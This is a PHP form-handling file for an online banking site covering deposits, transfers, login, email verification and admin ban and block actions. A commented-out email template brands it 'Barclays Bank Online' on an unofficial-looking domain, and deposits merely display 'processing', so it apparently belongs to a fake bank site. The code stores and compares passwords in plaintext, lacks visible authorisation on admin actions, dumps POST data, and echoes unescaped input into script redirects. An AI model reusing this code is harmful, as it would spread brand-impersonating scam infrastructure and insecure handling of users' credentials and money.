  <input id='total' class='modal_input' type='hidden' name='total' value='$total'>
  
  <input id='balance' class='modal_input' type='hidden' name='balance' value='$balance'>
  
 <center>
 <input type='hidden' name='paypay_final'>
 <button onclick=\"ajax_sub('paypay_final');\"  id='signup_user' class='site-btn' type='submit' name='paypay_final'>Deposit</button> 
 </center>
 </form>
 </div>";

}//end isset submit_paypal

?>


<?php
if(isset($_POST['paypay_final'])){
        $user = $_POST['user'];
    $amount = $_POST['amount'];
	$charge = 2/100 * $amount;
	$total = $charge + $amount;
		
		echo " Paypal Deposit processing! ";
		echo "<script> window.location='../dashboard/';</script>";

}//end isset paypay_final

?>



<?php
if(isset($_POST['submit_bitcoin'])){
        $user = $_POST['user'];
    $amount = $_POST['amount'];
	$charge = 2/100 * $amount;
	$total = $charge + $amount;
		
		echo "<div style='background-color:#f5f5f5; margin:10px; width:400px; text-align:left; border:1px solid grey; border-radius:8px; padding:5px; color:#000066;'> <center> <h5> <b>Deposit Preview (Bitcoin) </b></h5> </center>
		<form id='bitcoin_final' method='post' enctype='multipart/form-data' action='../ajax_submit.php'>
<span class='input_title'>Amount</span>
  <input id='account_no' class='modal_input' type='text' name='amount' value='$amount' disabled='disabled'>
  <input id='account_no' class='modal_input' type='hidden' name='amount' value='$amount'>
  
  
  <span class='input_title'>Charge </span>
  <input id='amount' class='modal_input' type='text' name='charge' value='USD $charge' disabled='disabled'>
  <input id='amount' class='modal_input' type='hidden' name='charge' value='$charge' >
  
  <span class='input_title'>Total </span>
   <input id='total' class='modal_input' type='text' name='total' value='USD $total' disabled='disabled'>
  <input id='total' class='modal_input' type='hidden' name='total' value='$total'>
  
  <input id='balance' class='modal_input' type='hidden' name='balance' value='$balance'>
  
 <center>
 <input type='hidden' name='bitcoin_final'>
 <button onclick=\"ajax_sub('bitcoin_final');\"  id='signup_user' class='site-btn' type='submit' name='paypay_final'>Deposit</button> 
 </center>
 </form>
 </div>";

}//end isset submit_bitcoin

?>


<?php
if(isset($_POST['bitcoin_final'])){
        $user = $_POST['user'];
    $amount = $_POST['amount'];
	$charge = 2/100 * $amount;
	$total = $charge + $amount;
		
		echo " Bitcoin Deposit processing! ";
		echo "<script> window.location='../dashboard/';</script>";

}//end isset bitcoin_final

?>

<?php
if(isset($_POST['submit_block_trans'])){
    $username = $_POST['user'];
    $status = $_POST['status'];
    $user_code = $_POST['user_code'];
	unset($_POST);
	if($status !== "block"){
		 $status = "block";
		 $msg = "User transfer was blocked successfully";
	}else{
		$status = "active";
		$msg = "User transfer was activated successfully";
	}
	
	
	
	
	     $data = array($status, $username);
	    //table colunm names
	    $query_fields = array("field_names"=>array("status"), "where"=>array("username ="), "data"=>$data);
	  
	    //call the method for database update
		 $db = new Db_conn();
		$db->update_db("account_info", $query_fields);//update verification status table
		
	 if($db->rows()>0){
	        $db->close_db();
	        echo "<b> $msg </b>";
			echo "<script> window.location='../view-user/?ref=$user_code';</script>";
	
        }else{
	
	        echo "<b>User transfer was not successful</b>";
        }//end if else	
	
}//end trans_own_final
?>


<?php
if(isset($_POST['submit_ban_user'])){
    $username = $_POST['user'];
    $status = $_POST['status'];
    $user_code = $_POST['user_code'];
	unset($_POST);
	if($status !== "banned"){
		 $status = "banned";
		 $msg = "User account was banned successfully";
	}else{
		$status = "active";
		$msg = "User account was activated successfully";
	}
	
	
	
	
	     $data = array($status, $username);
	    //table colunm names
	    $query_fields = array("field_names"=>array("status"), "where"=>array("username ="), "data"=>$data);
	  
	    //call the method for database update
		 $db = new Db_conn();
		$db->update_db("users", $query_fields);//update verification status table
		
	 if($db->rows()>0){
	        $db->close_db();
	        echo "<b> $msg </b>";
			echo "<script> window.location='../view-user/?ref=$user_code';</script>";
	
        }else{
	
	        echo "<b>User transfer was not successful</b>";
        }//end if else	
	
}//end ban user
?>


<?php
if(isset($_POST['submit_verify_email'])){
    $username = $_POST['user'];
    $status = $_POST['status'];
    $user_code = $_POST['user_code'];
	unset($_POST);
	if($status !== "no"){
		 $status = "no";
		 $msg = "User Email was unverified successfully";
	}else{
		$status = "yes";
		$msg = "User Email was verified successfully";
	}
	
	
	     $data = array($status, $username);
	    //table colunm names
	    $query_fields = array("field_names"=>array("verify_status"), "where"=>array("username ="), "data"=>$data);
	  
	    //call the method for database update
		 $db = new Db_conn();
		$db->update_db("users", $query_fields);//update verification status table
		
	 if($db->rows()>0){
	        $db->close_db();
	        echo "<b> $msg </b>";
			echo "<script> window.location='../view-user/?ref=$user_code';</script>";
	
        }else{
	
	        echo "<b>Email Verification was not successful</b>";
        }//end if else	
	
}//end ban user
?>


<?php
if(isset($_POST['submit_update'])){
    $username = $_POST['username'];
	
    $array_data = array("verify_code"=>$verify_code);
    $table_name = "users";//database table name
    $submit_button = "submit_update";
    unset($_POST['submit_update']);
	$form_data = $_POST;//valid form data
		
	//$user_code = rand(time(), 9999);
	//$verify_code = rand(1, 999999);
	$date = Date("Y-m-d");
	$time = Date("h:i:sa");
	$validate = new Validation();
	
	$validate->validate_data($form_data, $submit_button);
	$validate->add_valid_data($_SESSION['user_name']);
	$data = $validate->return_valid_data();
	
	if($validate->return_passed() == true){
		//table colunm names
	    $query_fields = array("field_names"=>array("f_name", "l_name", "phone_no"), "where"=>array("username ="), "data"=>$data);
	   $db = new Db_conn();
	    //call the method for database update
		$db->update_db($table_name, $query_fields);//update verification status table
		
		
        if($db->rows()>0){
	        $db->close_db();
	        echo "<b> Your profile was updated successfully </b>";
			//echo "<script> window.location='../login/';</script>";
	
        }else{
	
	        echo "<b>Update was Not Successful</b>";
        }//end if else
	}else{
		
		print_r($validate->return_error());
		
	}//end else
	 

echo"<br>*****************************************************<br>";

}//end isset update profile

?>


<?php
if(isset($_POST['admin_user_update'])){ print_r($_POST);
    $username = $_POST['username'];
	
    $table_name = "users";//database table name
    $submit_button = "admin_user_update";
    unset($_POST['admin_user_update']);
    unset($_POST['username']);
	$form_data = $_POST;//valid form data
		
	//$user_code = rand(time(), 9999);
	//$verify_code = rand(1, 999999);
	$date = Date("Y-m-d");
	$time = Date("h:i:sa");
	$validate = new Validation();
	
	$validate->validate_data($form_data, $submit_button);
	$validate->add_valid_data($username);
	$data = $validate->return_valid_data();
	
	if($validate->return_passed() == true){
		//table colunm names
	    $query_fields = array("field_names"=>array("f_name", "l_name", "email", "account_no", "phone_no", "password"), "where"=>array("username ="), "data"=>$data);
	   $db = new Db_conn();
	    //call the method for database update
		$db->update_db($table_name, $query_fields);//update verification status table
		
		
        if($db->rows()>0){
	        $db->close_db();
	        echo "<b> Your profile was updated successfully </b>";
			//echo "<script> window.location='../login/';</script>";
	
        }else{
	
	        echo "<b>Update was Not Successful</b>";
        }//end if else
	}else{
		
		print_r($validate->return_error());
		
	}//end else
	 

echo"<br>*****************************************************<br>";

}//end isset update profile

?>

<?php
if(isset($_POST['resend_code'])){
    //$verify_code = $_POST['verify_code'];
    //$username = $_POST['username'];
	echo " Error in processing, Please try again later!";
	
}//end resend code
?>
	
<?php
if(isset($_POST['verify_code'])){
    $verify_code = $_POST['verify_code'];
    $username = $_POST['username'];
	
    $array_data = array("verify_code"=>$verify_code);
    $table_name = "users";//database table name
    $submit_button = "verify_submit";
    unset($_POST['verify_submit']);
	$form_data = $_POST;//valid form data

    $validation = new Validation();
    $validation->validate_data($array_data, $submit_button);
if($validation->return_passed() == true){
	
    $query_fields = array("field_names"=>array("verify_code", "username"), "where"=>array("verify_code ="), "data"=>$validation->return_valid_data());
    $db = new Db_conn();
    $db->select_data($table_name, $query_fields);
	$row = $db->return_sth()->fetch();
	
	if($db->return_sth()->rowCount() > 0){
		
	//$user_code = rand(time(), 9999);
	//$verify_code = rand(1, 999999);
	$date = Date("Y-m-d");
	$time = Date("h:i:sa");
	$validate = new Validation();
	
	$validate->validate_data($form_data, $submit_button);
	$data = $validate->return_valid_data();
	
	if($validate->return_passed() == true){
		
		//table colunm names
	    $query_fields = array("field_names"=>array("verify_status"), "where"=>array("verify_code ="), "data"=>array("yes", $verify_code));
	   
	    //call the method for database update
		$db->update_db($table_name, $query_fields);//update verification status table
		
		/*
		//insert into contact table
		$field_names = array("member_id", "website", "email", "phone", "address", "facebook", "instagram", "whatsapp", "twitter");
		$data = array($member_id, "?","?","?","?","?","?","?","?");
		$db->insert_db("contact", $field_names, $data);
		*/
		
        if($db->rows()>0){
	        $db->close_db();
	        echo "<b> Your account has been verified successfully </b>";
			echo "<script> window.location='../login/';</script>";
	
        }else{
	
	        echo "<b>Verification was Not Successful</b>";
        }//end if else
	}else{
		
		print_r($validate->return_error());
		
	}//end else
	 
	}else{
		echo "<b> Verification code is not correct! </b>";
	}
	//end if 
	
}else{
	print_r($validation->return_error());
}//end if else

echo"<br>*****************************************************<br>";

}//end isset

?>



<?php
if(isset($_POST['login_submit'])){
    $submit_button = $_POST['login_submit'];
   // $keep_me_in = $_POST['keep_me_in'];
	unset($_POST['login_submit']);//remove submit button from array
	//unset($_POST['keep_me_in']);//remove keep_me_in data from the array
    $validation = new Validation();//instantiate validation class
    $validation->validate_data($_POST);//validate_data and return as array
	
	if($validation->return_passed() == true ){
		
		$table_name = "users";
		$data = $validation->return_valid_data();
		/*
		$salt1 = "!@%^";
		$salt2 = "0*1*7";
		$pw = $data[1];
		$data[1] = hash("ripemd128", "$salt1$pw$salt2");
		*/
		$query_fields = array("field_names"=>array("*"), "where"=>array("username =", "AND password ="), "data"=>$data, "limit"=>1);
		$check_user = new Db_conn();
		$check_user->select_data($table_name, $query_fields);
		
		if($check_user->rows() > 0 ){
			$row = $check_user->return_sth()->fetch();//fetch user data as array
			$_SESSION['user_code'] = $row['user_code'];
			$_SESSION['user_name'] = $row['username'];
			$_SESSION['f_name'] = $row['f_name'];
			$_SESSION['l_name'] = $row['l_name'];
			$_SESSION['passport'] = $row['passport'];
			$status = $row['verify_status'];
			$_SESSION['account_no'] = $row['account_no'];
			$_SESSION['email'] = $row['email'];
			$username = $row['username'];
			$account_status = $row['status'];
			//echo $status;
			//chech if user email is verified
			if($status == "yes"){
				//check if user account has been banned
			if($account_status == "banned"){
				
				echo " <div style='padding:10px; margin:10px;'> <span class='text-white'> Your account has been banned from our online banking because of suspicious IP address</span> <br> Please contact us for more details </div> ";
				
			}else{
				
				echo "<div style='color:#fff; margin:20px; font-size:18px;'> Login Successful! </div> <br> <br>";
				echo "<script> window.location='../dashboard/'; </script>";
			}//end account_status
				
				
			}else{
				echo "<b> User Account is Not Verified! </b> <br>";
				echo "<script> window.location='../login/?status=verify&user=$username';  </script>";
			}//end Status
			
			//set session to print features for logged in company or users
if(isset($_SESSION['user_code'])){
	$_SESSION['all_user'] = $_SESSION['user_id'];
	$_SESSION['all_user_mail'] = $row['email'];
	//set cookie for remember me if checked
		if(isset($keep_me_in)){
			if($keep_me_in == "signed_in"){
				$user_agent = $_SERVER['HTTP_USER_AGENT'];
				$value = hash("ripemd128", $user_agent.rand(time(), 9999).rand(1, 9999));
				setcookie('remember_me', $value, time()+86400*15, '/');
				$data = array($value, $_SESSION['all_user']);
				$query_fields = array("field_names"=>array("keep_me_in"), "where"=>array("member_id ="), "data"=>$data);
				$check_user->update_db($table_name, $query_fields);
			}//end if
			
		}//end isset
	$check_user->close_db();//close database connection
	}//end if
			//header("location:$redirect_link");
			//echo "<script> window.location='$redirect_link';  </script>";
			
		}else{
		echo "Wrong Details";
			
		}
		
	}else{
		
	 $empty = $validation->return_error();
	 $msg = $empty[0];
	 echo $msg;
	}
}//end isset
?>




<?php
if(isset($_POST['confirm_transfer'])){
    $username = $_POST['user'];
    $other_id = $_POST['other_id'];
	unset($_POST);
	
	
	     $data = array("confirmed", $other_id);
	    //table colunm names
	    $query_fields = array("field_names"=>array("status"), "where"=>array("other_id ="), "data"=>$data);
	  
	    //call the method for database update
		 $db = new Db_conn();
		$db->update_db("other_bank", $query_fields);//update verification status table
		
	 if($db->rows()>0){
	        $db->close_db();
			
			//select transaction details
			$db = new Db_conn();//instantiate database class
	$table_name = "other_bank";
	$data = array($other_id);
		$select_fields = array("field_names"=>array("*"), "where"=>array("other_id ="), "data"=>$data);
		
		$db->select_data($table_name, $select_fields );//call select method
		$row = $db->return_sth()->fetch();
		
		$amount = $row['amount'];
		$acc_no = $row['account_no'];
		$balance = $row['account_no'];
		$date = $row['account_no'];
	
			
			
			//send mail
			$user = get_user($username);
	
  $to = $user['email'];
//$cc = $_POST['cc'];
 $subject = "Transfer Approval";
 //$msg_body = $_POST['msg_body'];
/*
      $mailer = new PHPMailer\PHPMailer\PHPMailer();
         $mailer->From ='info@babankonline.com';
         $mailer->FromName='Barclays Bank Online';
         $mailer->Subject = $subject;
         $mailer->AddReplyTo('info@babankonline.com');
		 $mailer->AddAddress($to);
        if(!empty($cc)){$mailer->addCC($cc);}
        //if(!empty($bcc)){$mailer->addBCC($bcc);}
		
			$userN = ucfirst($user['username']);
			$email = $user['email'];
			$mailer->AddAddress($email);
	

               $mailer->IsHTML(true);

         $mailer->AddEmbeddedImage('logo_bank.png', 'logo', 'logo_bank.png');
         $mailer->Body =" <div style='width:98%; margin:0 auto; padding:5px;'> <img src=\"cid:logo\" alt=\"Barclays Bank Logo\" height=\"200\"  width=\"150\"/> </div>
		 <br>
		 <br>
		 Hello <b> $userN </b> <br> <br>
		 <center> <h4 style='color:green;'>Transaction Successful</h4> </center>
		 <br>
		 <p> Your Transfer has been confirmed</p>
		 <br>
         <div>
         <table border=0>
		 <tr><td><b>Amount:</b></td><td> $ $amount</td> </tr>
		 <tr><td><b>Account No:</b></td><td> $acc_no </td> </tr>
		 <tr><td><b>Balance:</b></td><td>$  $balance </td> </tr>
		 <tr><td><b>Date of transfer:</b> </td><td>  $date </td> </tr>
		
		 </table>
		 </div> <br>
     <p>
    <hr> <a href='https://www.babankonline.com'><img src=\"cid:logo\" alt=\"Barclays Bank Logo\" height=\"150\"  width=\"100\"/><br>Barclays Bank Online</a> </p>";
	
	$mailer->Send();
			*/
	        echo "<b> confirmation Successful! </b>";
			echo "<script> window.location='../pending-transfer/';</script>";
	
        }else{
	
	        echo "<b>Not successful, try again</b>";
        }//end if else	
	
}//end ban user
?>